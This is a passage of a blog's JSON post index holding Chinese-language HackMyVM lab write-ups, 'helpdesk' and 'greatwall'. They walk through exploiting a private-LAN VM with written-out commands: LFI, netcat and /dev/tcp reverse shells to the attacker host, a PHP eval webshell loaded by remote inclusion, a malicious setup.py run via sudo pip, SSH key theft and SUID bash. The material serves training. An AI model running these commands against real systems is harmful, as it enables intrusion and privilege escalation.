`Ctrl-c`\u9000\u51fa`mg`\u7f16\u8f91\u5668\u3002\n\n\u6b64\u65f6\uff0c`/bin/bash`\u5df2\u88ab\u8bbe\u7f6e\u4e86SUID\u4f4d\u3002\u4f7f\u7528`-p`\u53c2\u6570\u8fd0\u884cbash\u4ee5\u4fdd\u7559\u6709\u6548\u7528\u6237ID\uff08euid\uff09\u3002\n\n```bash\npeter@Griffin:~$ bash -p\nbash-5.0# id\nuid=1003(peter) gid=1003(peter) euid=0(root) egid=0(root) groups=0(root),1003(peter)\n```\n\n\u6210\u529f\u83b7\u5f97root\u6743\u9650\u3002\u8bfb\u53d6\u6700\u7ec8\u7684flag\u3002\n\n```bash\nbash-5.0# cat /root/root.txt /home/lois/user.txt\nflag{root-be93b7d7f0a30d5159c0460874e6e015}\nflag{user-f6b63474e7cc20b0893a82beb9e3b3fd}\n```sentence", "top": 0, "createdAt": 1755959319, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-23", "dateLabelColor": "#0969da"}, "P229": {"htmlDir": "docs/post/hmv_helpdesk.html", "labels": ["HackMyVM"], "postTitle": "hmv_helpdesk", "postUrl": "post/hmv_helpdesk.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/229", "commentNum": 0, "wordCount": 6660, "description": "# \u4e00\u3001\u4fe1\u606f\u6536\u96c6\n\n## **1. \u4e3b\u673a\u53d1\u73b0**\n\n\u9996\u5148\uff0c\u901a\u8fc7 `arp-scan` \u5bf9\u672c\u5730\u7f51\u7edc\u8fdb\u884c\u626b\u63cf\uff0c\u4ee5\u53d1\u73b0\u76ee\u6807\u4e3b\u673a\u7684IP\u5730\u5740\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.142 08:00:27:e5:04:39       PCS Systemtechnik GmbH\n...\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\u76ee\u6807\u4e3b\u673aIP\u4e3a `192.168.205.142`\u3002\n\n## **2. \u7aef\u53e3\u626b\u63cf**\n\n\u4f7f\u7528 `nmap` \u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u786e\u5b9a\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p0-65535 192.168.205.142\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-23 11:18 EDT\nNmap scan report for 192.168.205.142\nHost is up (0.0011s latency).\nNot shown: 65534 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:E5:04:39 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n...\n```\n\n\u626b\u63cf\u53d1\u73b0\u4e3b\u673a\u5f00\u653e\u4e86 22 (SSH) \u548c 80 (HTTP) \u7aef\u53e3\u3002\n\n## **3. Web\u76ee\u5f55\u626b\u63cf**\n\n\u8bbf\u95ee80\u7aef\u53e3\uff0c\u9875\u9762\u663e\u793a\u4e3a\u4e00\u4e2a\u6b63\u5728\u7ef4\u62a4\u7684\u201cHelpDesk Ticketing System\u201d\u3002\u4e3a\u4e86\u5bfb\u627e\u66f4\u591a\u4fe1\u606f\uff0c\u4f7f\u7528 `dirsearch` \u548c `gobuster` \u8fdb\u884c\u76ee\u5f55\u7206\u7834\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ dirsearch -u http://192.168.205.142/     \n...\n[11:19:21] 200 -  214B  - /debug.php\n[11:19:24] 301 -  242B  - /javascript  ->  http://192.168.205.142/javascript/\n[11:19:25] 200 -  756B  - /login.php\n[11:19:27] 302 -    0B  - /panel.php  ->  login.php\n...\n\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://192.168.205.142 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64\n...\n/index.php            (Status: 200) [Size: 1290]\n/login.php            (Status: 200) [Size: 1819]\n/ticket.php           (Status: 200) [Size: 204]\n/panel.php            (Status: 302) [Size: 0] [--> login.php]\n/debug.php            (Status: 200) [Size: 250]\n...\n```\n\n\u626b\u63cf\u53d1\u73b0\u4e86\u51e0\u4e2a\u5173\u952e\u6587\u4ef6\uff1a`debug.php`, `login.php`, `panel.php` \u548c `ticket.php`\u3002\n\n\u8bbf\u95ee `debug.php` \u9875\u9762\uff0c\u53d1\u73b0\u4e86\u4e00\u7ec4\u51ed\u8bc1\uff0c\u4f46\u7ecf\u8fc7\u5c1d\u8bd5\uff0c\u8fd9\u7ec4\u51ed\u8bc1\u65e0\u6cd5\u7528\u4e8e\u767b\u5f55\uff0c\u5c5e\u4e8e\u8bef\u5bfc\u4fe1\u606f\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl http://192.168.205.142/debug.php   \n<style>\n...\n</style><h2>Debug Mode Enabled</h2><pre>[DEBUG] Connecting to internal dev server...\n[DEBUG] Using creds: service_user:SuperSecretDev123!</pre>\n```\n\n# \u4e8c\u3001\u6f0f\u6d1e\u5229\u7528\n\n## **1. \u672c\u5730\u6587\u4ef6\u5305\u542b (LFI)**\n\n`ticket.php` \u9875\u9762\u770b\u8d77\u6765\u50cf\u4e00\u4e2a\u7968\u636e\u67e5\u770b\u5668\uff0c\u5c1d\u8bd5\u4f7f\u7528 `ffuf` \u5bf9\u5176\u53c2\u6570\u8fdb\u884c\u6a21\u7cca\u6d4b\u8bd5\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ ffuf -w ... -u 'http://192.168.205.142/ticket.php?FUZZ=id' --fw 24\n...\nurl                     [Status: 200, Size: 271, Words: 30, Lines: 5, Duration: 0ms]\n...\n```\n\nFuzzing \u53d1\u73b0\u4e86\u4e00\u4e2a\u540d\u4e3a `url` \u7684\u53c2\u6570\u3002\u901a\u8fc7\u8be5\u53c2\u6570\uff0c\u53ef\u4ee5\u8bfb\u53d6 `login.php` \u7684\u6e90\u4ee3\u7801\uff0c\u786e\u8ba4\u5b58\u5728\u672c\u5730\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl 'http://192.168.205.142/ticket.php?url=login.php'\n...\n<h1>Ticket Viewer</h1><pre><?php\nsession_start();\n...\n// Stored credentials\n$stored_user = 'helpdesk';\n\n// SHA-512 hash for password: ticketmaster\n$stored_hash = '$6$ABC123$fLo2MacCV.XBQeRZtHWL2297q/fUBs/b8gOmvLGuiz7wDgl3MSWcOOSKnTbaNPoUMCmEpY1dlwuPKbAtIuoo6.';\n...\n?>\n...\n```\n\n\u4ece `login.php` \u7684\u6e90\u7801\u4e2d\uff0c\u83b7\u5f97\u4e86\u7528\u6237\u540d `helpdesk` \u548c\u5bc6\u7801 `ticketmaster` \u7684\u54c8\u5e0c\u503c\u3002\u4f7f\u7528 `helpdesk:ticketmaster` \u6210\u529f\u767b\u5f55\u4e86Web\u540e\u53f0\u3002\n\n## **2. \u547d\u4ee4\u6267\u884c\u4e0e\u53cd\u5f39Shell**\n\n\u767b\u5f55\u540e\u7684\u9762\u677f\u5b58\u5728\u547d\u4ee4\u6267\u884c\u529f\u80fd\u3002\u5229\u7528\u8be5\u529f\u80fd\uff0c\u901a\u8fc7 `busybox nc` \u83b7\u53d6\u4e00\u4e2a\u53cd\u5f39shell\u3002\n\n\u5728Kali\u4e0a\u76d1\u542c8888\u7aef\u53e3\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nc -lvnp 8888\n```\n\n\u5728Web\u9762\u677f\u4e2d\u6267\u884c\uff1a\n\n```bash\nbusybox nc 192.168.205.128 8888 -e /bin/bash\n```\n\n\u6210\u529f\u83b7\u53d6 `www-data` \u7528\u6237\u7684shell\u3002\n\n```bash\nlistening on [any] 8888 ...\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.142] 51576\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\n\u4e3a\u65b9\u4fbf\u540e\u7eed\u64cd\u4f5c\uff0c\u901a\u8fc7\u4ee5\u4e0b\u6b65\u9aa4\u7a33\u5b9ashell\uff1a\n\n```bash\nscript /dev/null -c bash\nCtrl+Z\nstty raw -echo; fg\nreset xterm\nexport TERM=xterm\nexport SHELL=/bin/bash\nstty rows 36 columns 178\n```\n\n# \u4e09\u3001\u6743\u9650\u63d0\u5347\n\n## **1. www-data -> helpdesk**\n\n\u5728\u76ee\u6807\u4e3b\u673a\u4e0a\u8fdb\u884c\u4fe1\u606f\u641c\u96c6\uff0c\u5728 `/opt/helpdesk-socket/` \u76ee\u5f55\u4e0b\u53d1\u73b0\u4e86\u4e00\u4e2a\u53ef\u5229\u7528\u7684Unix\u5957\u63a5\u5b57\u3002\n\n```bash\nwww-data@helpdesk:/opt/helpdesk-socket$ ls -al\ntotal 16\ndrwxr-xr-x 2 helpdesk helpdesk 4096 Aug 23 15:17 .\ndrwxr-xr-x 4 root     root     4096 Aug 16 15:32 ..\n-rwxr-xr-x 1 helpdesk helpdesk  158 Aug 16 15:32 handler.sh\nsrwxrwxrwx 1 helpdesk helpdesk    0 Aug 23 15:17 helpdesk.sock\n-rw-r--r-- 1 root     root      184 Aug 16 15:44 serve.sh\n```\n\n\u67e5\u770b `handler.sh` \u548c `serve.sh` \u811a\u672c\u5185\u5bb9\uff1a\n\n```bash\nwww-data@helpdesk:/opt/helpdesk-socket$ cat *\n#!/bin/bash\n# Simple parser \u2014 executes anything sent over the socket (dangerous!)\nread cmd\necho '[HelpDesk Automation] Executing: $cmd'\n/bin/bash -c '$cmd'\ncat: helpdesk.sock: No such device or address\n#!/bin/bash\n\nSOCKET='/opt/helpdesk-socket/helpdesk.sock'\n\n[ -e '$SOCKET' ] && rm '$SOCKET'\n\n/usr/bin/socat -d -d UNIX-LISTEN:$SOCKET,fork,mode=777 EXEC:/opt/helpdesk-socket/handler.sh\n```\n\n**\u77e5\u8bc6\u70b9\u8865\u5145\uff1asocat \u4e0e UNIX Socket**\n\n*   **socat**\uff1a\u662f\u4e00\u4e2a\u5f3a\u5927\u7684\u7f51\u7edc\u5de5\u5177\uff0c\u582a\u79f0netcat\u7684\u589e\u5f3a\u7248\u3002 \u5b83\u7684\u6838\u5fc3\u529f\u80fd\u662f\u5728\u4e24\u4e2a\u6570\u636e\u6d41\u4e4b\u95f4\u5efa\u7acb\u4e00\u4e2a\u53cc\u5411\u901a\u9053\u3002 \u8fd9\u4e9b\u6570\u636e\u6d41\u53ef\u4ee5\u662f\u6587\u4ef6\u3001\u7ba1\u9053\u3001\u8bbe\u5907\u3001TCP/UDP\u5957\u63a5\u5b57\uff0c\u751a\u81f3\u662f\u6267\u884c\u7684\u7a0b\u5e8f\u3002\n*   **UNIX Socket**\uff1a\u8fd9\u662f\u4e00\u79cd\u5728\u540c\u4e00\u53f0\u673a\u5668\u4e0a\u7684\u8fdb\u7a0b\u95f4\u901a\u4fe1\uff08IPC\uff09\u673a\u5236\u3002 \u5b83\u4e0d\u7ecf\u8fc7\u7f51\u7edc\u534f\u8bae\u6808\uff0c\u800c\u662f\u901a\u8fc7\u6587\u4ef6\u7cfb\u7edf\u8fdb\u884c\u901a\u4fe1\uff0c\u56e0\u6b64\u6548\u7387\u66f4\u9ad8\u3002\n*   **\u6f0f\u6d1e\u5206\u6790**\uff1a`serve.sh` \u811a\u672c\u4ee5 `helpdesk` \u7528\u6237\u8eab\u4efd\u8fd0\u884c\uff0c\u5e76\u4f7f\u7528 `socat` \u521b\u5efa\u4e86\u4e00\u4e2a\u540d\u4e3a `helpdesk.sock` \u7684UNIX\u5957\u63a5\u5b57\u3002 \u5173\u952e\u5728\u4e8e `mode=777` \u53c2\u6570\uff0c\u5b83\u4f7f\u5f97\u4efb\u4f55\u7528\u6237\u90fd\u5bf9\u8fd9\u4e2asocket\u6587\u4ef6\u6709\u8bfb\u3001\u5199\u3001\u6267\u884c\u6743\u9650\u3002\u5f53\u6709\u6570\u636e\u53d1\u9001\u5230\u8fd9\u4e2asocket\u65f6\uff0c`EXEC:/opt/helpdesk-socket/handler.sh` \u4f1a\u88ab\u89e6\u53d1\uff0c`handler.sh` \u4f1a\u5c06\u63a5\u6536\u5230\u7684\u6570\u636e\u4f5c\u4e3a\u547d\u4ee4\u76f4\u63a5\u7528 `/bin/bash -c` \u6267\u884c\u3002\n\n\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\uff0c\u5c06\u4e00\u4e2a\u53cd\u5f39shell\u7684\u547d\u4ee4\u901a\u8fc7 `socat` \u53d1\u9001\u5230 `helpdesk.sock`\uff0c\u4ece\u800c\u4ee5 `helpdesk` \u7528\u6237\u6743\u9650\u6267\u884c\u3002\n\n\u5728Kali\u4e0a\u91cd\u65b0\u76d1\u542c8888\u7aef\u53e3\uff0c\u7136\u540e\u5728 `www-data` shell\u4e2d\u6267\u884c\uff1a\n\n```bash\nwww-data@helpdesk:/opt/helpdesk-socket$ echo '/bin/bash -i >& /dev/tcp/192.168.205.128/8888 0>&1' | socat - /opt/helpdesk-socket/helpdesk.sock\n```\n\n\u6210\u529f\u83b7\u5f97 `helpdesk` \u7528\u6237\u7684shell\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nc -lvnp 8888\nlistening on [any] 8888 ...\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.142] 53106\n...\nhelpdesk@helpdesk:/$ id\nuid=1001(helpdesk) gid=1001(helpdesk) groups=1001(helpdesk)\n```\n\n## **2. helpdesk -> root**\n\n\u4f7f\u7528 `sudo -l` \u67e5\u770b `helpdesk` \u7528\u6237\u7684sudo\u6743\u9650\u3002\n\n```bash\nhelpdesk@helpdesk:/$ sudo -l\n...\nUser helpdesk may run the following commands on helpdesk:\n    (ALL) NOPASSWD: /usr/bin/pip3 install --break-system-packages *\n```\n\n\u53d1\u73b0 `helpdesk` \u7528\u6237\u53ef\u4ee5\u514d\u5bc6\u4ee5root\u6743\u9650\u6267\u884c `pip3 install` \u547d\u4ee4\u3002\u8fd9\u662f\u4e00\u4e2a\u5df2\u77e5\u7684\u63d0\u6743\u5411\u91cf\u3002 \u5f53`pip install`\u5b89\u88c5\u4e00\u4e2a\u672c\u5730\u76ee\u5f55\u65f6\uff0c\u5b83\u4f1a\u6267\u884c\u8be5\u76ee\u5f55\u4e0b\u7684`setup.py`\u6587\u4ef6\u3002 \u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u6076\u610f\u7684`setup.py`\u6587\u4ef6\uff0c\u5728\u5176\u4e2d\u5305\u542b\u63d0\u6743\u547d\u4ee4\u3002\n\n\u521b\u5efa\u4e00\u4e2a\u5305\u542b\u63d0\u6743payload\u7684 `setup.py` \u6587\u4ef6\uff0c\u8be5payload\u4f1a\u7ed9 `/bin/bash` \u6dfb\u52a0SUID\u6743\u9650\u3002\n\n```bash\nhelpdesk@helpdesk:~$ mkdir 1;cd 1\nhelpdesk@helpdesk:~/1$ echo 'import os; os.system('chmod +s /bin/bash')' > setup.py\nhelpdesk@helpdesk:~/1$ ls -al /bin/bash\n-rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash\n```\n\n\u4f7f\u7528 `sudo` \u6267\u884c `pip3 install` \u6765\u5b89\u88c5\u5f53\u524d\u76ee\u5f55\u3002\n\n```bash\nhelpdesk@helpdesk:~/1$ sudo /usr/bin/pip3 install --break-system-packages .\nProcessing /home/helpdesk/1\n  Preparing metadata (setup.py) ... done\n...\nhelpdesk@helpdesk:~/1$ ls -al /bin/bash\n-rwsr-sr-x 1 root root 1446024 Mar 31  2024 /bin/bash\n```\n\n\u53ef\u4ee5\u770b\u5230 `/bin/bash` \u5df2\u7ecf\u6210\u529f\u88ab\u8bbe\u7f6e\u4e86SUID\u4f4d\u3002\u73b0\u5728\uff0c\u6267\u884c `bash -p` \u5373\u53ef\u83b7\u5f97root\u6743\u9650\u7684shell\u3002\n\n```bash\nhelpdesk@helpdesk:~/1$ bash -p\nbash-5.2# id\nuid=1001(helpdesk) gid=1001(helpdesk) euid=0(root) egid=0(root) groups=0(root),1001(helpdesk)\nbash-5.2# cat /root/root.txt /home/helpdesk/user.txt \nflag{request_has_been_escalated}\nflag{ticket_approved_by_thedesk}\n```\n\n\u6210\u529f\u83b7\u53d6root\u6743\u9650\u5e76\u8bfb\u53d6\u6700\u7ec8\u7684flag\u3002sentence", "top": 0, "createdAt": 1755963235, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-23", "dateLabelColor": "#0969da"}, "P230": {"htmlDir": "docs/post/hmv_greatwall.html", "labels": ["HackMyVM"], "postTitle": "hmv_greatwall", "postUrl": "post/hmv_greatwall.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/230", "commentNum": 0, "wordCount": 5784, "description": "# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n## **1.1. \u4e3b\u673a\u53d1\u73b0**\n\n\u9996\u5148\uff0c\u5728\u76ee\u6807\u7f51\u6bb5\u5185\u4f7f\u7528`arp-scan`\u5de5\u5177\u8fdb\u884c\u4e3b\u673a\u53d1\u73b0\uff0c\u786e\u5b9a\u76ee\u6807\u9776\u673a\u7684IP\u5730\u5740\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.131 00:0c:29:24:e9:11       VMware, Inc.\n...\n```\n\n\u4ece\u626b\u63cf\u7ed3\u679c\u4e2d\uff0c\u6211\u4eec\u8bc6\u522b\u51fa\u76ee\u6807\u4e3b\u673a\u7684IP\u5730\u5740\u4e3a `192.168.205.131`\u3002\n\n## **1.2. \u7aef\u53e3\u626b\u63cf**\n\n\u63a5\u4e0b\u6765\uff0c\u4f7f\u7528`rustscan`\u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u53d1\u73b0\u5176\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ rustscan -a 192.168.205.131\n...\nOpen 192.168.205.131:22\nOpen 192.168.205.131:80\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\uff0c\u76ee\u6807\u4e3b\u673a\u5f00\u653e\u4e86\u4e24\u4e2a\u7aef\u53e3\uff1a22 (SSH) \u548c 80 (HTTP)\u3002\n\n## **1.3. Web\u670d\u52a1\u63a2\u67e5**\n\n\u8bbf\u95ee\u76ee\u6807 `http://192.168.205.131`\uff0c\u53d1\u73b0\u4e00\u4e2aWeb\u9875\u9762\uff0c\u9875\u9762\u4e0a\u6709\u4e00\u4e2a\u8f93\u5165\u6846\uff0c\u63d0\u793a\u8bed\u4e3a 'Across the Great Wall we can reach every corner in the world'\u3002\n\n\u67e5\u770b\u9875\u9762\u6e90\u4ee3\u7801\uff0c\u53ef\u4ee5\u53d1\u73b0\u4e00\u4e2aGET\u65b9\u6cd5\u63d0\u4ea4\u7684\u8868\u5355\uff0c\u53c2\u6570\u540d\u4e3a `page`\u3002\n\n```html\n<body>\n    ...\n    <form method='GET' class='address-form'>\n        <input type='text' name='page' class='address-bar' placeholder='https://'>\n    </form>\n    ...\n</body>\n```\n\n# **\u4e8c\u3001\u6f0f\u6d1e\u5229\u7528 (\u83b7\u53d6Webshell)**\n\n## **2.1. LFI\u6f0f\u6d1e\u4e0e\u51fa\u7ad9\u9632\u706b\u5899\u7b56\u7565\u53d1\u73b0**\n\n\u6839\u636e\u529f\u80fd\u731c\u6d4b\uff0c`page`\u53c2\u6570\u53ef\u80fd\u7528\u4e8e\u5305\u542b\u6216\u8bf7\u6c42\u5176\u4ed6\u9875\u9762\u3002\u9996\u5148\u5c1d\u8bd5\u4f7f\u7528 `file://` \u534f\u8bae\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\uff0c\u6784\u9020Payload\uff1a`file:///etc/passwd`\u3002\n\n\u670d\u52a1\u5668\u6210\u529f\u8fd4\u56de\u4e86 `/etc/passwd` \u6587\u4ef6\u7684\u5185\u5bb9\uff0c\u8bc1\u5b9e\u4e86\u6b64\u5904\u5b58\u5728\u4e00\u4e2a\u672c\u5730\u6587\u4ef6\u5305\u542b (LFI) \u6f0f\u6d1e\u3002\n\n\u5728\u8fdb\u4e00\u6b65\u5229\u7528\u65f6\uff0c\u6211\u4eec\u53d1\u73b0\u4e86\u4e00\u4e2a\u5173\u952e\u9650\u5236\uff1a\u5f53\u5c1d\u8bd5\u4ece\u8fdc\u7a0b\u670d\u52a1\u5668\u5305\u542b\u6587\u4ef6\u6216\u53d1\u8d77\u53cd\u5f39shell\u65f6\uff0c\u8bf7\u6c42\u5747\u4f1a\u5931\u8d25\u3002\u7ecf\u8fc7\u591a\u6b21\u6d4b\u8bd5\uff0c\u53d1\u73b0**\u8be5\u670d\u52a1\u5668\u5b58\u5728\u51fa\u7ad9\uff08Egress\uff09\u9632\u706b\u5899\u7b56\u7565**\uff0c\u8fd9\u5e76\u975eWeb\u5e94\u7528\u5c42\u9762\u7684\u529f\u80fd\u9650\u5236\uff0c\u800c\u662f\u66f4\u5e95\u5c42\u7684\u7f51\u7edc\u914d\u7f6e\uff08\u4f8b\u5982iptables\uff09\u3002\u8be5\u7b56\u7565\u4e25\u683c\u9650\u5236\u4e86\u670d\u52a1\u5668\u5bf9\u5916\u53d1\u8d77\u7684\u8fde\u63a5\uff1a**\u53ea\u5141\u8bb8\u5411\u76ee\u6807\u7aef\u53e3\u4e3a 22 (SSH) \u548c 80 (HTTP) \u7684\u5730\u5740\u5efa\u7acb\u8fde\u63a5**\u3002\u4efb\u4f55\u8bd5\u56fe\u8fde\u63a5\u5230\u5176\u4ed6\u7aef\u53e3\uff08\u5982\u5e38\u7528\u76844444, 8080\u7b49\uff09\u7684\u51fa\u7ad9\u6d41\u91cf\u90fd\u4f1a\u88ab\u963b\u65ad\u3002\n\n\u8fd9\u4e00\u53d1\u73b0\u89e3\u91ca\u4e86\u4e3a\u4ec0\u4e48\u65e0\u8bba\u662f\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\u8fd8\u662f\u53cd\u5f39shell\uff0c\u90fd\u5fc5\u987b\u5c06\u6211\u4eec\u653b\u51fb\u673a\u4e0a\u7684\u76d1\u542c\u670d\u52a1\u8bbe\u7f6e\u5728 80 \u6216 22 \u7aef\u53e3\u3002\n\n## **2.2. \u8fdc\u7a0b\u6587\u4ef6\u5305\u542bGetshell**\n\n\u5229\u7528LFI\u6f0f\u6d1e\uff0c\u5e76\u9075\u4ece\u76ee\u6807\u670d\u52a1\u5668\u7684\u51fa\u7ad9\u9632\u706b\u5899\u7b56\u7565\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba9\u76ee\u6807\u670d\u52a1\u5668\u5305\u542b\u5e76\u6267\u884c\u6211\u4eec\u81ea\u5df1\u670d\u52a1\u5668\u4e0a\u7684\u6076\u610fPHP\u6587\u4ef6\uff0c\u4ece\u800c\u83b7\u53d6Webshell\u3002\n\n1. **\u51c6\u5907Webshell**: \u5728Kali\u653b\u51fb\u673a\u4e0a\u521b\u5efa\u4e00\u4e2a\u7b80\u5355\u7684PHP\u4e00\u53e5\u8bdd\u6728\u9a6c `ant.php`\u3002\n\n   ```shell\n   \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n   \u2514\u2500$ cat ant.php \n   <?php eval($_POST['ant']); ?>\n   ```\n\n2. **\u5f00\u542fHTTP\u670d\u52a1**: \u5728`ant.php`\u6240\u5728\u76ee\u5f55\uff0c\u4f7f\u7528Python\u5f00\u542f\u4e00\u4e2a\u4e34\u65f6\u7684HTTP\u670d\u52a1\u5668\u3002**\u6839\u636e\u524d\u4e00\u6b65\u53d1\u73b0\u7684\u51fa\u7ad9\u9632\u706b\u5899\u7b56\u7565\uff0c\u6b64HTTP\u670d\u52a1\u5fc5\u987b\u5f00\u542f\u572880\u7aef\u53e3**\uff0c\u5426\u5219\u76ee\u6807\u670d\u52a1\u5668\u5c06\u65e0\u6cd5\u8bbf\u95ee\u3002\n\n   ```shell\n   \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n   \u2514\u2500$ sudo python3 -m http.server 80\n   Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n   ```\n\n3. **\u5305\u542b\u8fdc\u7a0bWebshell**: \u5728\u76ee\u6807Web\u9875\u9762\u7684\u8f93\u5165\u6846\u4e2d\uff0c\u6784\u9020Payload\u6307\u5411\u6211\u4eecKali\u653b\u51fb\u673a\u4e0a\u7684webshell\uff1a`http://192.168.205.128/ant.php`\u3002\n\n4. **\u8fde\u63a5Webshell**: \u4f7f\u7528\u8681\u5251 (AntSword) \u8fde\u63a5\u76ee\u6807\uff0cURL\u4e3a `http://192.168.205.131/`\uff0c\u5728\u8bf7\u6c42\u6570\u636e\u7684 `page` \u53c2\u6570\u4e2d\u586b\u5165\u6211\u4eec\u7684\u8fdc\u7a0b\u9a6c\u5730\u5740 `http://192.168.205.128/ant.php`\uff0c\u8fde\u63a5\u5bc6\u7801\u4e3a `ant`\u3002\n\n\u6210\u529f\u8fde\u63a5\u540e\uff0c\u6211\u4eec\u83b7\u5f97\u4e86\u76ee\u6807\u670d\u52a1\u5668\u7684Webshell\uff0c\u5f53\u524d\u7528\u6237\u4e3a `www-data`\u3002\n\n# **\u4e09\u3001\u6743\u9650\u63d0\u5347**\n\n## **3.1. www-data -> wall**\n\n\u5728Webshell\u4e2d\uff0c\u6211\u4eec\u53d1\u73b0\u5f53\u524d\u7528\u6237 `www-data` \u53ef\u4ee5\u901a\u8fc7 `sudo` \u4ee5 `wall` \u7528\u6237\u7684\u8eab\u4efd\u6267\u884c `chmod` \u547d\u4ee4\u3002\n\n```shell\n(www-data:/var/www/html) $ sudo -l\n...\nUser www-data may run the following commands on this host:\n    (ALL : wall) NOPASSWD: /bin/chmod\n```\n\n\u867d\u7136\u53ef\u4ee5\u76f4\u63a5\u6267\u884c `chmod`\uff0c\u4f46\u65e0\u6cd5\u76f4\u63a5\u5229\u7528\u5b83\u6765\u4fee\u6539 `/bin/bash` \u7b49\u7cfb\u7edf\u6587\u4ef6\u7684\u6743\u9650\u4ee5\u76f4\u63a5\u63d0\u6743\u3002\u4f46\u662f\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u6743\u9650\u6765\u4fee\u6539 `wall` \u7528\u6237\u5bb6\u76ee\u5f55\u7684\u6743\u9650\uff0c\u4ece\u800c\u8bfb\u53d6\u5176SSH\u79c1\u94a5\u3002\n\n1. **\u4fee\u6539wall\u5bb6\u76ee\u5f55\u6743\u9650**:\n\n   ```shell\n   (www-data:/home) $ ls -la\n   drwx------  4 wall wall 4096 May 11 02:41 wall\n   (www-data:/home) $ sudo -u wall chmod 755 wall\n   (www-data:/home) $ ls -la\n   drwxr-xr-x  4 wall wall 4096 May 11 02:41 wall\n   ```\n\n2. **\u8bfb\u53d6SSH\u79c1\u94a5**: \u8fdb\u5165 `wall` \u7528\u6237\u7684 `.ssh` \u76ee\u5f55\uff0c\u4fee\u6539\u79c1\u94a5 `id_rsa` \u7684\u6743\u9650\u5e76\u8bfb\u53d6\u5176\u5185\u5bb9\u3002\n\n   ```shell\n   (www-data:/home/wall/.ssh) $ sudo -u wall chmod 600 id_rsa\n   (www-data:/home/wall/.ssh) $ cat id_rsa\n   -----BEGIN OPENSSH PRIVATE KEY-----\n   b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\n   ...\n   QMXdH6a7iy89MAAAAOd2FsbEBncmVhdHdhbGwBAgMEBQ==\n   -----END OPENSSH PRIVATE KEY-----\n   ```\n\n3. **SSH\u767b\u5f55**: \u5c06\u590d\u5236\u7684\u79c1\u94a5\u4fdd\u5b58\u5728Kali\u653b\u51fb\u673a\u672c\u5730\uff08\u4f8b\u5982 `/tmp/id_rsa`\uff09\uff0c\u8d4b\u4e88 `600` \u6743\u9650\uff0c\u7136\u540e\u4f7f\u7528\u8be5\u79c1\u94a5\u4ee5 `wall` \u7528\u6237\u8eab\u4efdSSH\u767b\u5f55\u76ee\u6807\u4e3b\u673a\u3002\n\n   ```shell\n   \u250c\u2500\u2500(kali\u327fkali)-[/tmp]\n   \u2514\u2500$ vim id_rsa\n   \u250c\u2500\u2500(kali\u327fkali)-[/tmp]\n   \u2514\u2500$ chmod 